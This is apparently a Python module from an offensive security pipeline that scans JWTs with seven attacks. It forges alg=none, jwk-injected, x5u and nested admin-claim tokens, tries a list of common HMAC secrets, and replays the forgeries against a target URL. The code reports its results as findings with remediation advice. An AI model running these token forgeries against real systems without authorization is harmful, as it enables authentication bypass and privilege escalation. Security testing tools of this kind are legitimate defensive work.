"""JWT scanner — replaces jwt_tool.

Attacks:
  1. alg=none  — strip signature
  2. Weak HMAC — dictionary of top-1000 common secrets
  3. kid path traversal — inject ../../../dev/null as kid
  4. RS→HS confusion — use RSA public key as HMAC secret
"""

from __future__ import annotations

import base64
import json
from typing import TYPE_CHECKING, Any

from network_pipeline.scanners import Scanner, register_scanner
from network_pipeline.scanners._common import ScanResult, ScanFinding

if TYPE_CHECKING:
    from network_pipeline.tools.runtime import HTTPClient

# Top common JWT secrets (shortened for space; real list in skills/checks/params.txt)
_COMMON_SECRETS = [
    "secret", "password", "123456", "test", "admin", "key", "jwt",
    "qwerty", "changeme", "your_secret_key", "mysecret", "supersecret",
    "token", "app_secret", "secret_key", "jwt_secret", "secret123",
    "password123", "1234567890", "abcdef", "letmein", "", "null",
    "undefined", "development", "production", "staging", "jwt-secret",
]


@register_scanner
class JWTScanner(Scanner):
    name = "jwt_scan"
    requires_libs = ("jwt", "cryptography")
    opsec_min = "loud"
    loud_level = "low"

    def __init__(self, http_client: "HTTPClient") -> None:
        self._http = http_client

    async def scan(
        self,
        token: str,
        verify_url: str | None = None,
    ) -> ScanResult:
        """Attempt multiple JWT attacks on the given token."""
        findings: list[ScanFinding] = []

        # Decode header/payload without verification
        header, payload = _decode_jwt_parts(token)
        if header is None:
            return ScanResult(
                scanner=self.name, target=verify_url or "jwt",
                success=False, error="invalid JWT format",
            )

        alg = header.get("alg", "")
        kid = header.get("kid", "")

        # 1. alg=none
        none_finding = await self._alg_none(token, header, payload, verify_url)
        if none_finding:
            findings.append(none_finding)

        # 2. Weak HMAC secret
        if alg.upper().startswith("HS"):
            hmac_finding = self._weak_hmac(token, header, payload)
            if hmac_finding:
                findings.append(hmac_finding)

        # 3. kid path traversal
        if kid:
            kid_finding = self._kid_traversal(token, header, payload, kid)
            if kid_finding:
                findings.append(kid_finding)

        # 4. RS→HS confusion
        if alg.upper().startswith("RS"):
            rsh_finding = self._rsh_confusion(token, header, payload)
            if rsh_finding:
                findings.append(rsh_finding)

        # ── Phase-J 2026 modern JWT attacks ────────────────────────
        # 5. jwk-self-injection: forge a token whose header carries the
        #    public key the server will use to verify. CVE-2018-0114
        #    pattern, still found in 2026 audits of Java JWT libs.
        jwk_finding = await self._jwk_self_inject(
            token, header, payload, verify_url,
        )
        if jwk_finding:
            findings.append(jwk_finding)

        # 6. x5u-SSRF: server fetches signing certificate from a URL
        #    the attacker controls. Combine with OAST callback if
        #    available so the scanner emits *verified* findings.
        x5u_finding = await self._x5u_ssrf(
            token, header, payload, verify_url,
        )
        if x5u_finding:
            findings.append(x5u_finding)

        # 7. cty:JWT recursive-confusion: nest a JWS inside a JWE so
        #    the server validates the outer claim but trusts the inner
        #    forged content.
        cty_finding = self._cty_confusion(token, header, payload)
        if cty_finding:
            findings.append(cty_finding)

        return ScanResult(
            scanner=self.name,
            target=verify_url or "jwt",
            success=True,
            data={
                "algorithm": alg,
                "kid": kid,
                "attacks_tried": 7,
                "findings": len(findings),
            },
            findings=findings,
            raw_text=_format_jwt(token[:40], findings),
        )

    # ── Phase-J 2026 modern JWT attack helpers ─────────────────────

    async def _jwk_self_inject(
        self,
        token: str,
        header: dict,
        payload: dict,
        verify_url: str | None,
    ) -> "ScanFinding | None":
        """Craft a token whose header carries an attacker-controlled JWK.

        Vulnerable libs verify the token using the embedded key — letting
        any attacker mint admin tokens. Detected by encoding a freshly
        generated RSA key into the header's ``jwk`` field, signing the
        forgery with that key, then replaying.
        """
        try:
            from cryptography.hazmat.primitives.asymmetric import rsa  # type: ignore[import-untyped]
            from cryptography.hazmat.primitives import serialization  # type: ignore[import-untyped]
            import jwt as pyjwt  # type: ignore[import-untyped]
        except Exception:
            return None
        try:
            priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
            pub = priv.public_key()
            pub_numbers = pub.public_numbers()

            def _b64u_uint(n: int) -> str:
                length = (n.bit_length() + 7) // 8
                return base64.urlsafe_b64encode(
                    n.to_bytes(length, "big"),
                ).decode("ascii").rstrip("=")

            jwk_pub = {
                "kty": "RSA",
                "use": "sig",
                "alg": "RS256",
                "n": _b64u_uint(pub_numbers.n),
                "e": _b64u_uint(pub_numbers.e),
                "kid": "evil-jwk",
            }
            new_header = {**header, "alg": "RS256", "jwk": jwk_pub}
            priv_pem = priv.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption(),
            )
            forged = pyjwt.encode(
                payload, priv_pem, algorithm="RS256", headers=new_header,
            )
        except Exception:
            return None

        if verify_url:
            resp = await self._http.get(
                verify_url,
                headers={"Authorization": f"Bearer {forged}"},
                scanner_tool=self.name,
            )
            if resp and resp.status_code in (200, 201, 204):
                return ScanFinding(
                    vuln_class="jwt-jwk-self-injection",
                    title="JWT jwk-self-injection accepted",
                    severity="critical",
                    affected_target=verify_url,
                    description=(
                        "The server validated a JWT using the public key "
                        "embedded in the token's own `jwk` header. An "
                        "attacker mints any claim set with a freshly "
                        "generated keypair."
                    ),
                    cwe=["CWE-347"],
                    mitre=["T1078"],
                    remediation=(
                        "Pin verification to a server-side keystore. "
                        "Never trust `jwk`/`x5c`/`x5u` headers from the "
                        "token itself."
                    ),
                    confidence="verified",
                )
        return ScanFinding(
            vuln_class="jwt-jwk-self-injection",
            title="JWT may be vulnerable to jwk-self-injection",
            severity="high",
            affected_target="jwt",
            description="Forged token with embedded jwk crafted — test against server.",
            cwe=["CWE-347"],
            confidence="probable",
        )

    async def _x5u_ssrf(
        self,
        token: str,
        header: dict,
        payload: dict,
        verify_url: str | None,
    ) -> "ScanFinding | None":
        """Forge a header pointing ``x5u`` at an OAST callback URL.

        If the server fetches the URL we registered, we have BOTH an
        SSRF primitive AND a confused-deputy verification path.
        """
        try:
            from network_pipeline.tools.oast import get_current
            oast = get_current()
        except Exception:
            oast = None
        if oast is None or not getattr(oast, "enabled", False):
            return None
        token_id, callback_url = oast.url(scheme="https")
        new_header = {**header, "alg": "RS256", "x5u": callback_url}
        try:
            import jwt as pyjwt  # type: ignore[import-untyped]
            forged = pyjwt.encode(
                payload, "x5u-ssrf-probe", algorithm="HS256",
                headers=new_header,
            )
        except Exception:
            return None
        if verify_url:
            await self._http.get(
                verify_url,
                headers={"Authorization": f"Bearer {forged}"},
                scanner_tool=self.name,
            )
        hit = await oast.wait_for(token_id, timeout=8.0)
        if hit is not None:
            return ScanFinding(
                vuln_class="jwt-x5u-ssrf",
                title="JWT x5u header triggered SSRF callback",
                severity="critical",
                affected_target=verify_url or "jwt",
                description=(
                    f"Server fetched the URL specified in the JWT `x5u` "
                    f"header (OAST callback received from "
                    f"{hit.remote_addr}). Adversaries chain this with "
                    "metadata endpoints (169.254.169.254) and internal "
                    "service enumeration."
                ),
                cwe=["CWE-918", "CWE-347"],
                mitre=["T1078", "T1190"],
                confidence="verified",
                extra={"oast_remote_addr": hit.remote_addr},
            )
        return None

    def _cty_confusion(
        self,
        token: str,
        header: dict,
        payload: dict,
    ) -> "ScanFinding | None":
        """Detect cty:JWT nested-token confusion surface.

        We can't reliably probe this without a server-side oracle —
        instead we craft the nested token and emit a probable finding so
        operators can replay it manually. Real exploitation requires
        the server to be a JWE consumer that auto-unwraps.
        """
        if (header.get("typ") or "").upper() == "JWE":
            return None  # already a JWE — different attack class
        try:
            import jwt as pyjwt  # type: ignore[import-untyped]
            inner = pyjwt.encode(
                {**payload, "role": "admin"},
                "cty-probe", algorithm="HS256",
            )
            outer_header = {**header, "alg": "none", "cty": "JWT"}
            outer = _craft_jwt(outer_header, {"nested": inner}, None)
            return ScanFinding(
                vuln_class="jwt-cty-confusion",
                title="JWT cty=JWT nested-confusion test token crafted",
                severity="medium",
                affected_target="jwt",
                description=(
                    "The pipeline produced a cty:JWT-confusion probe. "
                    "Some JWT libraries unwrap the inner token without "
                    "re-validating the algorithm, letting attackers smuggle "
                    "forged claims through the outer envelope."
                ),
                cwe=["CWE-345", "CWE-347"],
                confidence="probable",
                extra={"crafted_token": outer},
            )
        except Exception:
            return None

    async def _alg_none(
        self,
        token: str,
        header: dict,
        payload: dict,
        verify_url: str | None,
    ) -> ScanFinding | None:
        try:
            import jwt as pyjwt
            new_header = {**header, "alg": "none"}
            forged = _craft_jwt(new_header, payload, None)

            if verify_url:
                resp = await self._http.get(
                    verify_url,
                    headers={"Authorization": f"Bearer {forged}"},
                    scanner_tool=self.name,
                )
                if resp and resp.status_code in (200, 201, 204):
                    return ScanFinding(
                        vuln_class="jwt-alg-none",
                        title="JWT alg=none accepted by server",
                        severity="critical",
                        affected_target=verify_url or "jwt",
                        description="Server accepted alg=none JWT with no signature.",
                        cwe=["CWE-347"],
                        mitre=["T1078"],
                        remediation="Explicitly reject alg=none in JWT library config.",
                        confidence="verified",
                    )
            else:
                # Report as probable (no server to verify against)
                return ScanFinding(
                    vuln_class="jwt-alg-none",
                    title="JWT may be vulnerable to alg=none attack",
                    severity="high",
                    affected_target="jwt",
                    description="alg=none forged token crafted — test against server.",
                    cwe=["CWE-347"],
                    remediation="Explicitly reject alg=none in JWT library config.",
                    confidence="probable",
                )
        except ImportError:
            pass
        return None

    def _weak_hmac(self, token: str, header: dict, payload: dict) -> ScanFinding | None:
        try:
            import jwt as pyjwt
            alg = header.get("alg", "HS256")
            for secret in _COMMON_SECRETS:
                try:
                    pyjwt.decode(token, secret, algorithms=[alg])
                    return ScanFinding(
                        vuln_class="jwt-weak-secret",
                        title=f"JWT signed with weak secret: {secret!r}",
                        severity="critical",
                        affected_target="jwt",
                        description=f"JWT HMAC secret is {secret!r} — trivially brute-forced.",
                        cwe=["CWE-798"],
                        mitre=["T1078"],
                        remediation="Use a cryptographically random secret ≥32 bytes.",
                        confidence="verified",
                        extra={"secret": secret},
                    )
                except Exception:
                    continue
        except ImportError:
            pass
        return None

    def _kid_traversal(
        self, token: str, header: dict, payload: dict, kid: str
    ) -> ScanFinding | None:
        # If kid contains path traversal chars, it's already suspicious
        if any(t in kid for t in ("../", "..\\", "/etc/", "/dev/")):
            return ScanFinding(
                vuln_class="jwt-kid-traversal",
                title="JWT kid claim contains path traversal pattern",
                severity="high",
                affected_target="jwt",
                description=f"kid={kid!r} suggests path traversal LFI in JWT key loading.",
                cwe=["CWE-22", "CWE-347"],
                remediation="Validate kid against a strict allowlist; never use it as a file path.",
                confidence="probable",
            )
        return None

    def _rsh_confusion(self, token: str, header: dict, payload: dict) -> ScanFinding | None:
        # Flag as probable — requires knowing the RSA public key
        return ScanFinding(
            vuln_class="jwt-rs-hs-confusion",
            title="JWT uses RSA — test RS→HS algorithm confusion",
            severity="medium",
            affected_target="jwt",
            description=(
                "Token uses RSA algorithm. If server accepts HS256 with the RSA "
                "public key as the HMAC secret, it is vulnerable to RS→HS confusion."
            ),
            cwe=["CWE-347"],
            remediation="Strictly whitelist accepted algorithms; don't derive HMAC key from RSA public key.",
            confidence="unverified",
        )


def _decode_jwt_parts(token: str) -> tuple[dict | None, dict | None]:
    try:
        parts = token.split(".")
        if len(parts) < 2:
            return None, None
        header = json.loads(_b64_decode(parts[0]))
        payload = json.loads(_b64_decode(parts[1]))
        return header, payload
    except Exception:
        return None, None


def _b64_decode(s: str) -> bytes:
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)


def _b64_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _craft_jwt(header: dict, payload: dict, secret: bytes | None) -> str:
    h = _b64_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64_encode(json.dumps(payload, separators=(",", ":")).encode())
    if secret is None:
        return f"{h}.{p}."
    import hmac as _hmac
    import hashlib
    alg = header.get("alg", "HS256")
    hash_fn = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}.get(alg, hashlib.sha256)
    sig = _hmac.new(secret, f"{h}.{p}".encode(), hash_fn).digest()
    return f"{h}.{p}.{_b64_encode(sig)}"


def _format_jwt(token_prefix: str, findings: list[ScanFinding]) -> str:
    lines = [f"JWT scan on {token_prefix}...:"]
    if findings:
        for f in findings:
            lines.append(f"  [{f.severity}] {f.vuln_class}: {f.title}")
    else:
        lines.append("  No vulnerabilities found.")
    return "\n".join(lines)
